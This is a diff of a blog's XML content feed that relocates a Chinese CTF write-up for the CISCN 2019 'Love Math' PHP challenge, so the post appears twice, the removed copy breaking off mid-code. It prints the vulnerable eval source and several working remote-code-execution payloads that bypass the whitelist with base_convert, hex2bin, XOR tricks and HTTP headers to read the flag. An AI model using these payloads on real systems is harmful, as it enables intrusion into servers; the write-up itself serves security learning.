+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195716.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195731.png" /></p>
+<p>成功获得flag。</p>
+<h1 id="总结">总结</h1>
+<p>本题给我的感觉更像是杂项。不过我也通过该题学到了字符拥有<code>Numeric Value</code>这个属性。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Unicode</tag>
+        <tag>Numeric Value</tag>
       </tags>
   </entry>
   <entry>
@@ -1975,6 +1975,65 @@
       </tags>
   </entry>
   <entry>
+    <title>CISCN 2019 初赛 Love Math</title>
+    <url>/2022/04/10/CISCN%202019%20%E5%88%9D%E8%B5%9B%20Love%20Math/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN%202019%20初赛%5DLove%20Math">Love Math</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境直接就给了源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
+<h1 id="解题">解题</h1>
+<p>需要先知道几个PHP的特性：</p>
+<ul>
+<li>动态函数。<code>$func='print_r';$func('hello');</code>，这句代码是能够输出hello的，那是因为<code>$func</code>被<code>print_r</code>代替，因此能够成功执行。</li>
+<li>函数名为字符串。从上面的例子也可以看出函数名是字符串。</li>
+</ul>
+<p>先分析一下代码，首先设置了一个黑名单，然后再设置了一个白名单，也就是我们传入的参数<code>c</code>不能有黑名单的字符，又必须包含白名单的字符，而且长度不能超过80。这样子才能够最终执行到<code>eval('echo '.$content.';');</code>。</p>
+<p>因此，本题考察的应该是RCE。我们<strong>需要将<code>$content</code>通过某种方式变为类似<code>system('ls')</code>命令</strong>。</p>
+<h2 id="方法1">方法1</h2>
+<p>先放出最开始的payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure></p>
+<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(784,10,36) -&gt; ls</span><br><span class="line">因此，等价于system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></p>
+<p>也成功被执行：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410141715.png" /></p>
+<p>但是，当执行有特殊符号的时候就不行了，比如<code>system('ls /')</code>，因为特殊符号不能直接用36进制表达，如果直接输入则因为不在白名单而无法通过。因此需要利用<code>hex2bin</code>将16进制的转为字符，但是16进制也无法过白名单（纯数字可以过，或者白名单内的函数名可以过），因此还需要将16进制转为10进制才可以。因此就由了如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))</span><br></pre></td></tr></table></figure></p>
+<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(37907361743,10,36) -&gt; hex2bin</span><br><span class="line">dechex(1819484207) -&gt; 6c73202f(ls /的16进制表示)</span><br><span class="line">因此，等价于system(hex2bin(6c73202f)) -&gt; system(&#x27;ls /&#x27;)</span><br></pre></td></tr></table></figure></p>
+<p>但是，此时的长度已经超过80了。</p>
+<hr />
+<center>
+小知识
+</center>
+<p>接下来就得想如何将长度缩减，忽然发现可以在url中这样传入数据： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?p=$cmd=id;system($_GET[cmd])</span><br></pre></td></tr></table></figure></p>
+<p>这样子最终传入的<code>p</code>为<code>system(id)</code>。</p>
+<hr />
+<p>因此可以利用这种办法只在<code>c</code>参数传入必要的，剩下的都通过上述方式放到<code>c</code>中。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls /&#x27;)</span><br><span class="line">-&gt; ?c=($$pi)&#123;min&#125;(($$pi)&#123;max&#125;)</span><br><span class="line"></span><br><span class="line">其中$pi=base_convert(37907361743,10,36)(dechex(1598506324)) -&gt; _GET</span><br><span class="line">这样子($$pi)&#123;min&#125;(($$pi)&#123;max&#125;) -&gt; $_GET&#123;min&#125;($_GET&#123;max&#125;)</span><br><span class="line">其中，&#123;&#125;用于代替[]，即$_GET[min]($_GET[max])</span><br></pre></td></tr></table></figure></p>
+<p>然后再传入<code>min=system</code>和<code>max=ls /</code>即可。最终payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;max&#125;)&amp;pi=system&amp;max=ls /</span><br><span class="line"></span><br><span class="line">如果使用min长度就会超，因此其中一个变量使用pi（这里$pi和pi是不一样的，前者是变量，后者就是一个参数名）</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144104.png" /></p>
+<p>将<code>max=cat /flag</code>带入即可得到flag。</p>
+<p>也可以直接执行，不过要找到比较短的命令（思路也是类似的）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line"></span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure></p>
+<h2 id="方法2">方法2</h2>
+<p>利用一个函数<code>getallheaders</code>，然后把命令通过HTTP头部传入。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;cmd&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pi(696468,10,36) -&gt; exec</span><br><span class="line">$pi(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="line">因此，等价于exec(getallheaders()&#123;2&#125;)，就是获取HTTP头部信息中，字段为2的内容。</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144931.png" /></p>
+<h2 id="方法3">方法3</h2>
+<p>前两种方法都是利用将要传入的命令转为数字，然后通过函数再转换回对应的函数名，从而执行命令。但是其实白名单里面有许多的可用字符，用这些字符代替之前的数字，进行某种运算得到想要的函数名。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410150225.png" /></p>
+<p>会发现 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_nan^64==&gt;_G</span><br><span class="line">tan^15==&gt;ET</span><br></pre></td></tr></table></figure></p>
+<p>因此，最终的payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结">总结</h1>
+<p>这题考察的都是关于PHP的知识（我这不会PHP的太难了）</p>
+<ul>
+<li>各种编码转换绕过</li>
+<li>URL中使用<code>$_GET</code>获取数据</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP知识</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF 2018 Online Tool</title>
     <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -2052,65 +2111,6 @@
         <tag>PHP</tag>
         <tag>RCE</tag>
         <tag>nmap命令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CISCN 2019 初赛 Love Math</title>
-    <url>/2022/04/10/CISCN%202019%20%E5%88%9D%E8%B5%9B%20Love%20Math/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN%202019%20初赛%5DLove%20Math">Love Math</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境直接就给了源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
-<h1 id="解题">解题</h1>
-<p>需要先知道几个PHP的特性：</p>
-<ul>
-<li>动态函数。<code>$func='print_r';$func('hello');</code>，这句代码是能够输出hello的，那是因为<code>$func</code>被<code>print_r</code>代替，因此能够成功执行。</li>
-<li>函数名为字符串。从上面的例子也可以看出函数名是字符串。</li>
-</ul>
-<p>先分析一下代码，首先设置了一个黑名单，然后再设置了一个白名单，也就是我们传入的参数<code>c</code>不能有黑名单的字符，又必须包含白名单的字符，而且长度不能超过80。这样子才能够最终执行到<code>eval('echo '.$content.';');</code>。</p>
-<p>因此，本题考察的应该是RCE。我们<strong>需要将<code>$content</code>通过某种方式变为类似<code>system('ls')</code>命令</strong>。</p>
-<h2 id="方法1">方法1</h2>
-<p>先放出最开始的payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure></p>
-<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(784,10,36) -&gt; ls</span><br><span class="line">因此，等价于system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></p>
-<p>也成功被执行：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410141715.png" /></p>
-<p>但是，当执行有特殊符号的时候就不行了，比如<code>system('ls /')</code>，因为特殊符号不能直接用36进制表达，如果直接输入则因为不在白名单而无法通过。因此需要利用<code>hex2bin</code>将16进制的转为字符，但是16进制也无法过白名单（纯数字可以过，或者白名单内的函数名可以过），因此还需要将16进制转为10进制才可以。因此就由了如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))</span><br></pre></td></tr></table></figure></p>
-<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(37907361743,10,36) -&gt; hex2bin</span><br><span class="line">dechex(1819484207) -&gt; 6c73202f(ls /的16进制表示)</span><br><span class="line">因此，等价于system(hex2bin(6c73202f)) -&gt; system(&#x27;ls /&#x27;)</span><br></pre></td></tr></table></figure></p>
-<p>但是，此时的长度已经超过80了。</p>
-<hr />
-<center>
-小知识
-</center>
-<p>接下来就得想如何将长度缩减，忽然发现可以在url中这样传入数据： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?p=$cmd=id;system($_GET[cmd])</span><br></pre></td></tr></table></figure></p>
-<p>这样子最终传入的<code>p</code>为<code>system(id)</code>。</p>
-<hr />
-<p>因此可以利用这种办法只在<code>c</code>参数传入必要的，剩下的都通过上述方式放到<code>c</code>中。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls /&#x27;)</span><br><span class="line">-&gt; ?c=($$pi)&#123;min&#125;(($$pi)&#123;max&#125;)</span><br><span class="line"></span><br><span class="line">其中$pi=base_convert(37907361743,10,36)(dechex(1598506324)) -&gt; _GET</span><br><span class="line">这样子($$pi)&#123;min&#125;(($$pi)&#123;max&#125;) -&gt; $_GET&#123;min&#125;($_GET&#123;max&#125;)</span><br><span class="line">其中，&#123;&#125;用于代替[]，即$_GET[min]($_GET[max])</span><br></pre></td></tr></table></figure></p>
-<p>然后再传入<code>min=system</code>和<code>max=ls /</code>即可。最终payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;max&#125;)&amp;pi=system&amp;max=ls /</span><br><span class="line"></span><br><span class="line">如果使用min长度就会超，因此其中一个变量使用pi（这里$pi和pi是不一样的，前者是变量，后者就是一个参数名）</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144104.png" /></p>
-<p>将<code>max=cat /flag</code>带入即可得到flag。</p>
-<p>也可以直接执行，不过要找到比较短的命令（思路也是类似的）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line"></span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure></p>
-<h2 id="方法2">方法2</h2>
-<p>利用一个函数<code>getallheaders</code>，然后把命令通过HTTP头部传入。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;cmd&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pi(696468,10,36) -&gt; exec</span><br><span class="line">$pi(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="line">因此，等价于exec(getallheaders()&#123;2&#125;)，就是获取HTTP头部信息中，字段为2的内容。</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144931.png" /></p>
-<h2 id="方法3">方法3</h2>
-<p>前两种方法都是利用将要传入的命令转为数字，然后通过函数再转换回对应的函数名，从而执行命令。但是其实白名单里面有许多的可用字符，用这些字符代替之前的数字，进行某种运算得到想要的函数名。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span 